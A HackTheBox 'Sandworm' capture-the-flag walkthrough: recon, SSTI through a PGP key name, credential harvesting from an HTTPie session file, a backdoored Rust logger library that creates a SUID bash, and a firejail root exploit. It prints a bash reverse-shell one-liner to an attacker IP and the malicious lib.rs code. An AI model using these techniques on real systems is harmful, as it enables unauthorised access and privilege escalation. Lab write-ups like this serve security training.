---
layout: post
title: HackTheBox-Sandworm Walkthrough
date: 2023-11-18 07:00:00 -500
categories: [HackTheBox Walkthrough]
tags: [HackTheBox]
image:
  path: /assets/img/headers/Sandworm.webp
---

# Description :
Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as 'silentobserver.' Uncovered a Rust script running as root, leveraged a firejail vulnerability for privilege escalation, ultimately achieving root access on the Linux machine.


## Nmap :

```bash
nmap -p 22,80,443 -sCV ssa.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-17 20:19 GMT
Nmap scan report for ssa.htb (10.10.11.218)
Host is up (0.15s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds

```

from `nmap` we have OpenSSH 8.9p1 on Port 22, nginx 1.18.0 on Ports 80 and 443 with SSL certificate for "SSA,".
The site redirect us to http://ssa.htb/ 



## website 443 :

This site seems to be the online presence of the Secret Spy Agency (SSA), specializing in cryptology, foreign signals intelligence (SIGINT), and cybersecurity services to enhance national security efforts.

![main page](/assets/img/posts/htb-sandworm/home.png)

### dirsearch :

```bash
 dirsearch -u ssa.htb                     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/_ssa.htb/_23-11-17_19-53-48.txt

Target: https://ssa.htb/

[19:53:48] Starting: 
[19:54:12] 200 -    5KB - /about                                            
[19:54:15] 302 -  227B  - /admin  ->  /login?next=%2Fadmin                  
[19:54:56] 200 -    3KB - /contact                                          
[19:55:20] 200 -    9KB - /guide                                            
[19:55:40] 200 -    4KB - /login                                            
[19:55:41] 302 -  229B  - /logout  ->  /login?next=%2Flogout                
                                                                             
Task Completed

```

checking login page , but it seems nothing to do here 

![Login](/assets/img/posts/htb-sandworm/login.png)

The notice indicates that the site is powered by Flask, which means this site is using flask framework. Let's keep that in mind.

![flask](/assets/img/posts/htb-sandworm/flask.png)

The contact page showcases a form for submitting encrypted tips. It seems nothing interesting; let's move on to the guide page

![contact](/assets/img/posts/htb-sandworm/contact.png)

Secret Spy Agency's site appears to provide interactive exercises for PGP encryption/decryption, emphasizing secure communication practices

![Alt text](/assets/img/posts/htb-sandworm//guide.png)


## PGP (Pretty Good Privacy) :

* <span style="color:red">Background</span> :

*Pretty Good Privacy (PGP) is a robust encryption protocol that employs a combination of symmetric-key and public-key cryptography for secure message communication. In the encryption process, a random symmetric key is generated for message content, which is then encrypted using the recipient's public key. Upon receiving the encrypted message, the recipient uses their private key to decrypt the symmetric key, enabling subsequent decryption of the actual message content. PGP ensures end-to-end security, user authentication, and message integrity, making it a widely adopted solution for secure electronic communication*

![alt text](/assets/img/posts/htb-sandworm/how-does-pgp-encryption-work.webp)



# Shell as atlas

## Identify SSTI (Server Side Template Injection) 


We are moving to the 'Verify Signature' section, generating a PGP public key and PGP signed message. This can be done using a PGP tool that is already available on Debian distribution
![verify nignature](/assets/img/posts/htb-sandworm/verify_signature.png)

### generate pgp public and private keys:

```bash
┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]
└─# gpg --gen-key
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: emsec
Email address: emsec@emsec.com
You selected this USER-ID:
    "emsec <emsec@emsec.com>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? o
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/root/.gnupg/openpgp-revocs.d/C98C59FAEFAD2A327A70709AAD5FD26F46AE1182.rev'
public and secret key created and signed.

pub   rsa3072 2023-11-17 [SC] [expires: 2025-11-16]
      C98C59FAEFAD2A327A70709AAD5FD26F46AE1182
uid                      emsec <emsec@emsec.com>
sub   rsa3072 2023-11-17 [E] [expires: 2025-11-16]

```
Find the pgp public key we just created :

```bash
┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]
└─# gpg --verbose --armor --export emsec 
gpg: writing to stdout
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGVX8hoBDADhzt0lyX/MRpz5qiuQwdr6AR9U+KgHIlbZ2dwHyhBASe9dYr1X
fvFAt/YBrmFKu7X5KGeh6HIQckLhhJcFZ+J37FDcr521Uhfn1tHcNpv8HmURuXVT
G1x824bjnEjh/mNv3yszAGMmsTKoU9Pfh7S/KexdepuRVo5VyPZFjDtToClvGmFA
RTdY0OgIiocm+FMMPDNTTNmXICfYXNcjLPwYFfYrEdZZD76UDVvQNjF2yz2N1YsK
-----------------------<snippet key>----------------------------
1KQsPHtXFl5nAaki2LAAAF6FL7jfKJ/PHnMq/rFiCwFlDh+zRCCg2yeKnqt8TpcH
5wMVN/EyMmNleI68AonFepIDWXB28U0p/Pstff2TVkqvOLlCB+svpOxnJLgqfwus
u1d6LQ85ObGfKyX+RVWXtNWBuYzpXzw6foFI7l197MQ28aWabFdez1GA3SZ9jTab
9eRUTJbTYMNVmpj0FLZrWemSCowFhV0xFq5jcWz0yG9hnmq9fDor5bAdLBRQ3J05
F3MZanTAkQCjZ3ZyyPc294yBcWitytsE/jMlvslxIPtz4IAQWPQdl33Hk+YVlOIK
MDkH5NEqU+1Cv72TiQA/JH/wdBgVCcvJT+i4QeHpXeJGBBrUyOourbxN49ZUdegC
x/VT3u7XAwzYvjLtnZuZb+jH4WSqWTxFBDXz9Q5y
=I2R6
-----END PGP PUBLIC KEY BLOCK-----
```
### Generate pgp signed message :

Create a file called 'test' containing any text. Next, to create a PGP signed message, we will sign this file 'test' with our PGP public key using the command:

```bash
┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]
└─# touch test_file

┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]
└─# echo "This is emsec" > test_file                           
                                                                                       
┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]
└─# gpg --verbose -u emsec --clear-sign test_file 
gpg: writing to 'test_file.asc'
gpg: pinentry launched (137563 gnome3:curses 1.2.1 /dev/pts/3 xterm-256color :0.0 20600/0/5 0/0 -)
gpg: RSA/SHA512 signature from: "8FF1A1B62986214E emsec <emsec@emsec.com>"


┌──(root㉿emsec)-[~emsec/hackthebox/sandworm]
└─# cat test_file.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

This is emsec
-----BEGIN PGP SIGNATURE-----

iQHEBAEBCgAuFiEE5nPSS1qEnKUqTXuNj/GhtimGIU4FAmVX/u8QHGVtc2VjQGVt
c2VjLmNvbQAKCRCP8aG2KYYhTqkvDADL+dxWozCGyFv5j0SPR/jZxts8Wzn52cfj
8Khrqsod1xy534K+mWmadv1Un7W70z+DEki6GPuK7bNDGvGPUmuyHzSCGPqUZhl0
0elQDmpc5uDOsVFVfjm+0zk/O34V/YKm6KhSIKNKRkuGgaUI38u/xA0KgHgCs3xW
nr1y3PzZ1owdcLFCzeUTpKJKcFgCcSXZSdixC3K7oaiAN2CAF4PBs6RAgMZ0hny5
JNDhUaPEWCIafA7ZFvqE6aKWAesXyUIuMHxGLZ/EcsyleMfuhKsgyQYYusOzbk0H
61NzJjTGDWG4G1cn0eWot51w9gcMPO37ZWyYrMpJXgWpZhG4O76BpytEnLWZaix4
iYJHXWgFtZm0FPJso+ji7hhTa4eyu9Bvhq/r2SVAk4NTvD2INQBipn2CghpYzlu0
/c2fmqmxrUT0W0E86Q/uJXMMn99AZxQSr947Ye/3id0JkRkTnO3z8omdvf9kUIr6
koQWgRor6npAHtqQA/5+LRoubvdY6HM=
=OXZm
-----END PGP SIGNATURE-----
```

Now let's go back to `/guide` and enter the GPG public key and signed text that we just generated.

Great! Our signature is valid, but more importantly, we see it reflects our username `emsec` in the message. This is a good sign because we can manipulate this name to reflect our input. Let's try SSTI payloads.

![signature result](/assets/img/posts/htb-sandworm/result.png)

### Find 

We generate the PGP public key and PGP signed message in the same way as before. By including the ssti codes, we successfully load the payload for SSTI.

![output of ssti](/assets/img/posts/htb-sandworm/ssti_1.png)

 
* SSTI diagram from Hacktricks

![ssti](/assets/img/posts/htb-sandworm/ssti_2.png)

Now we will do the same thing of modifying the username, generating the key, etc., to get RCE and have a rev shell

The reason we base64 the reverse shell is that certain characters are not allowed for the username in PGP keys

* encode the shell to base64

```
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.173/4444 0>&1'" | base64
```

* The finall payload :

![ssti payload](/assets/img/posts/htb-sandworm/ssti_payload.png)

## atlas –> silentobserver

### Enumeration :

I tried to add my public SSH key to the Atlass user, but I got a `Read-only file system` error.

```bash
atlas@sandworm:~/.ssh$ ls
authorized_keys
atlas@sandworm:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrvOsMQHqYKD7JfCOM4HExbn1Xd4thzE8owKTZzvRry1aaLSi3EumO9pLySC2h9ItTTWlMl1zGl68lzwRbrxgeVbNzw423T/Hzou+RqjsMzbSdvf<snippet>MH0vXHfDoUe5FZbUwZ+S4rgVhwYOniT6ecBWUouwn5C/gb/N85ym2taZTX+2wQNL723s+fdIBtsW3GK5/0vLSuKPxBEa9xkErNuC46oS/1sGsz0k32ZwG+5magDf8YGxlanefgli+09FdCtu8gHJd+T4cmgNYQZ1dA7emysCvNgVC7TSqcfBEGM= root@emsec" >> authorized_keys
<mysCvNgVC7TSqcfBEGM= root@emsec" >> authorized_keys
bash: authorized_keys: Read-only file system
```

If we try several commands like `whoami` and `sudo -l`, we will see that they are not found, which left me a little confused.

If we go to the `atlas` user directories, we will be able to see that there is a `.config` directory.

```bash
atlas@sandworm:~$ ls -la
ls -la
total 52
drwxr-xr-x 8 atlas  atlas   4096 Nov 17 16:06 .
drwxr-xr-x 4 nobody nogroup 4096 May  4  2023 ..
lrwxrwxrwx 1 nobody nogroup    9 Nov 22  2022 .bash_history -> /dev/null
-rw-r--r-- 1 atlas  atlas    220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 atlas  atlas   3771 Nov 22  2022 .bashrc
drwxrwxr-x 2 atlas  atlas   4096 Jun  6 08:49 .cache
drwxrwxr-x 3 atlas  atlas   4096 Feb  7  2023 .cargo
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .config
-rwxrwxrwx 1 atlas  atlas   7955 Nov 17 16:06 exploit.py
drwx------ 4 atlas  atlas   4096 Nov 18 02:00 .gnupg
drwxrwxr-x 6 atlas  atlas   4096 Feb  6  2023 .local
-rw-r--r-- 1 atlas  atlas    807 Nov 22  2022 .profile
drwx------ 2 atlas  atlas   4096 Nov 17 16:12 .ssh
atlas@sandworm:~$ cd .config
cd .config
atlas@sandworm:~/.config$ ls
ls
firejail
httpie
```

/home/atlas/.config has Firejail and HTTPie. Firejail is a sandbox program designed to prevent security breaches by restricting the environment. Going further, in /home/atlas/.config/httpie/sessions/localhost_5000/admin.json, we have the following:

```json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```
We have SSH credentials for the `silentobserver` user

### SSH :
silentobserver:quietLiketheWind22

With these creds, I can SSH as silentobserver

```bash
┌──(root㉿emsec)-[~]
└─# ssh silentobserver@ssa.htb    
...[snip]...
Last login: Fri Nov 17 15:51:57 2023 from 10.10.14.112
silentobserver@sandworm:~$ whoami
silentobserver
silentobserver@sandworm:~$ 
```

And read `user.txt`:
```bash
silentobserver@sandworm:~$ cat user.txt 
0646b5ff************************
```

## silentobserver –> atlas

Searching for SUID binaries, we found one that doesn't seem common.

```bash
silentobserver@sandworm:~$ find / -perm -u=s -type f 2>/dev/null
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
```

### lib.rs
By running pspy, we can deduce that the routine launched every two minutes is executed by root but as the user `atlas`, that it is Rust, and that the folder to target is `/opt/crates`

![Alt text](/assets/img/posts/htb-sandworm/pspy64-1.png)

In the directory `/opt/crates/logger/src`, we find a single lib.rs file. Through the process of elimination, we can reasonably assume that this is the file compiled by Atlas every two minutes.

```bash
silentobserver@sandworm:/tmp$ cd /opt/crates/logger/src 
silentobserver@sandworm:/opt/crates/logger/src$ ls
lib.rs
silentobserver@sandworm:/opt/crates/logger/src$ ls -la
total 12
drwxrwxr-x 2 atlas silentobserver 4096 May  4  2023 .
drwxr-xr-x 5 atlas silentobserver 4096 May  4  2023 ..
-rw-rw-r-- 1 atlas silentobserver  732 May  4  2023 lib.rs
silentobserver@sandworm:/opt/crates/logger/src$ 
```

Essentially, the code interacts with a database using upstream to pull and manipulate files. Notably, it uses an external library: extern crate logger. What makes this interesting is that the library is not imported from the internet but from the machine itself. So, it must be located within the project. After a brief search, we find it at the path: `/opt/crates/logger/src`

```bash
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```
If we see its permissions, in the group part it tells us that there are read and write permissions for the silentobserver group :

```bash
silentobserver@sandworm:/opt/crates/logger/src$ ls -la lib.rs 
-rw-rw-r-- 1 atlas silentobserver 732 May  4  2023 lib.rs
```

Fortunately, we belong to that group:
```bash
silentobserver@sandworm:/opt/crates/logger/src$ id
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
```

The exploitation involves modifying `/opt/crates/logger/src/lib.rs` to copy `/bin/bash` to `/tmp/bash` and add SUID to it, like this:

### Modifing lib.rs 

```bash
extern crate chrono;

use std::fs::{self, OpenOptions};
use std::io::Write;
use std::process::Command;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!(
        "[{}] - User: {}, Query: {}, Justification: {}\n",
        timestamp, user, query, justification
    );

    let mut file = match OpenOptions::new()
        .append(true)
        .create(true)
        .open("/opt/tipnet/access.log")
    {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }

    // Copy /bin/bash to /tmp/bash
    if let Err(e) = fs::copy("/bin/bash", "/tmp/bash") {
        println!("Error copying file: {}", e);
        return;
    }

    // Set SUID permission on /tmp/bash
    if let Err(e) = Command::new("chmod")
        .args(&["+s", "/tmp/bash"])
        .output()
    {
        println!("Error setting SUID permission: {}", e);
        return;
    }
}
```
Then run `/tmp/bash -p` after a few minutes to gain control of atlas

```bash
silentobserver@sandworm:/opt/crates/logger/src$ /tmp/bash -p
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
bash-5.1$ whoami
atlas
bash-5.1$ 
```
By adding our public SSH key to the 'atlas' user, we can easily connect using SSH.

```bash
┌──(root㉿emsec)-[~/.ssh]
└─# ssh -i id_rsa atlas@ssa.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)
...[snip]...
Last login: Sat Nov 18 11:21:21 2023 from 10.10.14.43
atlas@sandworm:~$ 
```

## Privilege escalation : atlas -> root 

### Enumeration

Upon checking the user and group ID, it is revealed that the `atlas` user belongs to a group called 'jailer'.

```bash
atlas@sandworm:~$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)

```

If we search for SUID biaries we can see one from firejail:

```bash
atlas@sandworm:~$ find / -group jailer -ls 2>/dev/null
     1344   1740 -rwsr-x---   1 root     jailer    1777952 Nov 29  2022 /usr/local/bin/firejail
atlas@sandworm:~$ 
```
### SUID firejail privilege escalation

Here, the next step involves searching Google for firejail exploits that enable privilege escalation. I came across [this one](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25):

![Alt text](/assets/img/posts/htb-sandworm/firejail.png)

So, acquire the exploit.py, grant it execute permissions, and execute it. Once run, background the process, then execute 'firejail --join=27179' and 'su -' to obtain root access.

```bash
atlas@sandworm:/tmp$ chmod +x exploit.py 
atlas@sandworm:/tmp$ ./exploit.py 
You can now run 'firejail --join=27179' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
^Z
[1]+  Stopped                 ./exploit.py
atlas@sandworm:/tmp$ firejail --join=27179
changing root to /proc/27179/root
Warning: cleaning all supplementary groups
Child process initialized in 10.03 ms
atlas@sandworm:/tmp$ su -
root@sandworm:~# cat /root/root.txt
12d54f557*************************
root@sandworm:~# 
```
**Happy Hacking ! 👾​❤️​**

# References :

[What is PGP Encryption and How Does It Work?](https://www.varonis.com/blog/pgp-encryption)

[Making and verifying signatures](https://www.gnupg.org/gph/en/manual/x135.html)

[SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

[PayloadsAllTheThings/Server Side Template Injection/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

[SUID Firejail](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/#firejail)


